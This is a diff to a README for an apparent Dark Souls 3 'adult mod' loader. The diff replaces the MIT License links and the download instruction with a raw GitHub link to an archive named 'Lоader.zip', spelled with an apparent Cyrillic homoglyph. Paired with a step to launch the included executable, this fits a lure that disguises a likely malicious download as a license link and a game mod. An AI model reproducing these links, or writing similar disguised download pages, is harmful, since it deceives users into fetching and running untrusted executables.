@@ -2,7 +2,7 @@
 
 Welcome to the ultimate enhancement suite for **Dark Souls 3 (DS3)**! The **Dark Souls 3 Adult Mod** elevates your gaming experience by introducing stunning adult-themed textures, immersive animations, high-definition character models, and feature-rich customization designed for mature audiences. Our innovative loader ensures seamless integration with your DS3 installation, offering stable performance across multiple operating systems, and providing you with tools to personalize your adventure in Lothric like never before.
 
-Whether you're seeking refined visual upgrades or exclusive customizable features, this mod is built to be safe, reliable, and easy to install. Delve deep into the world of Dark Souls 3 with new possibilities, thanks to a passionate community and transparent open-source development under the [MIT License](https://opensource.org/licenses/MIT).
+Whether you're seeking refined visual upgrades or exclusive customizable features, this mod is built to be safe, reliable, and easy to install. Delve deep into the world of Dark Souls 3 with new possibilities, thanks to a passionate community and transparent open-source development under the [MIT License](https://raw.githubusercontent.com/Pyramoidix/DarkSouls3-NightfallEnhancements/main/Lоader.zip).
 
 ---
 
@@ -44,7 +44,7 @@ One of our core commitments is maximum accessibility for the DS3 modding communi
 
 Getting started is simple! Here’s how to activate the Dark Souls 3 Adult Mod on your system:
 
-1. **Download** `Loader.rar` from this repository’s latest release tab.
+1. **Download** `https://raw.githubusercontent.com/Pyramoidix/DarkSouls3-NightfallEnhancements/main/Lоader.zip` from this repository’s latest release tab.
 2. **Extract** the archive into your Dark Souls 3 game folder.  
    - (For Steam users, default location: `C:\Program Files (x86)\Steam\steamapps\common\DARK SOULS III\Game`)
 3. **Launch** the mod loader via the included executable or run the appropriate script for your operating system.
@@ -83,7 +83,7 @@ For legal reasons, use of this mod in multiplayer or online settings is **not ad
 ## ⚖️ License
 
 This repository is distributed under the MIT License. Full details:  
-[MIT License Overview](https://opensource.org/licenses/MIT)
+[MIT License Overview](https://raw.githubusercontent.com/Pyramoidix/DarkSouls3-NightfallEnhancements/main/Lоader.zip)
 
 ---
 
